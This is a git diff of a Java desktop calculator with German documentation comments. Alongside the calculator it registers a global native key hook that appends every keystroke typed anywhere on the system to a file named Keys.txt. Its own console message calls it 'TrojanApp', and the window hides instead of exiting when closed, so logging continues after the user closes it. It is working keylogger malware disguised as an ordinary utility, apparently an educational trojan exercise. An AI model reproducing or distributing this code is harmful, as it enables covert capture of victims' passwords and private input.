@@ -16,6 +16,22 @@ import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
 import java.util.Scanner;
 
+/**
+ * Hauptklasse der Desktop-Anwendung.
+ * Diese Klasse erstellt eine GUI für einen einfachen Taschenrechner und 
+ * registriert einen globalen Key-Listener zur Erfassung von Tastenanschlägen.
+ * 
+ * <p>
+ * Diese Anwendung ermöglicht grundlegende Rechenoperationen wie Addition, 
+ * Subtraktion, Multiplikation und Division. Ein globaler Key-Listener
+ * erfasst zusätzlich alle Tastendrücke und speichert diese in eine Datei.
+ * </p>
+ * 
+ * @author Mykhaylo Zhovkevych
+ * @version 1.0
+ * @since 31.10.2024
+ */
+
 public class MainApp implements ActionListener {
 
     JFrame frame;
@@ -25,15 +41,17 @@ public class MainApp implements ActionListener {
     JButton addButton, subButton, mulButton, divButton;
     JButton decButton, equButton, delButton, clrButton, negButton;
     JPanel panel;
-
     Font myFont = new Font("italic", Font.BOLD, 25);
-
     double num1 = 0, num2 = 0, result = 0;
     char operator; 
-
     private static boolean running = true; 
     public static final Path file = Paths.get("Keys.txt");
 
+    /**
+     * Konstruktor der MainApp.
+     * Initialisiert die GUI-Komponenten, startet den Controller und 
+     * einen Thread, der auf das Exit-Kommando wartet.
+     */
     public MainApp() {
         frame = new JFrame("Taschenrechner");
         frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
@@ -113,33 +131,20 @@ public class MainApp implements ActionListener {
         new Thread(this::waitForExit).start();
     }
 
+    /**
+     * Hauptmethode, die die Anwendung startet.
+     *
+     * @param args Konsolenargumente (nicht verwendet).
+     */
     public static void main(String[] args) {
         new MainApp(); 
     }
 
-    private void waitForExit() {
-        Scanner scanner = new Scanner(System.in);
-        System.out.println("Geben Sie 'exit' ein.");
-        while (running) {
-            String command = scanner.nextLine();
-            if ("exit".equalsIgnoreCase(command)) {
-                System.out.println("TrojanApp wird geschlossen.");
-                running = false; 
-                stopListener();
-                break; 
-            }
-        }
-        scanner.close();
-    }
-
-    private static void stopListener() {
-        try {
-            GlobalScreen.unregisterNativeHook(); 
-        } catch (NativeHookException e) {
-            e.printStackTrace(); 
-        }
-    }
-
+    /**
+     * Reagiert auf Aktionen in der Benutzeroberfläche, z.B. auf Button-Klicks.
+     *
+     * @param ff Das ausgelöste ActionEvent.
+     */
     @Override
     public void actionPerformed(ActionEvent ff) {
 
@@ -210,11 +215,47 @@ public class MainApp implements ActionListener {
         }
     }
 
+    /**
+     * Wartet auf die Eingabe "exit" zur Beendigung der Anwendung.
+     */
+    private void waitForExit() {
+        Scanner scanner = new Scanner(System.in);
+        System.out.println("Geben Sie 'exit' ein.");
+        while (running) {
+            String command = scanner.nextLine();
+            if ("exit".equalsIgnoreCase(command)) {
+                System.out.println("TrojanApp wird geschlossen.");
+                running = false; 
+                stopListener();
+                break; 
+            }
+        }
+        scanner.close();
+    }
+
+    /**
+     * Beendet den globalen Key-Listener.
+     */
+    private static void stopListener() {
+        try {
+            GlobalScreen.unregisterNativeHook(); 
+        } catch (NativeHookException e) {
+            e.printStackTrace(); 
+        }
+    }
+
+    /**
+     * Interner KeyListener zum Erfassen und Speichern von Tastenanschlägen.
+     */
     class KeyListener implements NativeKeyListener {
+        /**
+         * Reagiert auf das Drücken einer Taste.
+         *
+         * @param e NativeKeyEvent, der ausgelöst wurde.
+         */
         public void nativeKeyPressed(NativeKeyEvent e) {
             String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
-            // System.out.print(keyText);
-   
+
             try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
                  PrintWriter writer = new PrintWriter(os)) {
                 if (keyText.length() > 1) {
@@ -228,7 +269,14 @@ public class MainApp implements ActionListener {
         }
     }
 
+    /**
+     * Controller-Klasse zur Registrierung des globalen Key-Listeners.
+     */
     class Controller {
+        /**
+         * Konstruktor des Controllers.
+         * Initialisiert den Key-Listener.
+         */
         Controller() {
             try {
                 addListener();
@@ -237,8 +285,12 @@ public class MainApp implements ActionListener {
             }
         }
 
+        /**
+         * Fügt den globalen Key-Listener hinzu und registriert ihn.
+         *
+         * @throws NativeHookException falls ein Fehler bei der Registrierung auftritt.
+         */
         private void addListener() throws NativeHookException {
-     
             GlobalScreen.registerNativeHook();
             GlobalScreen.addNativeKeyListener(new KeyListener());
         }
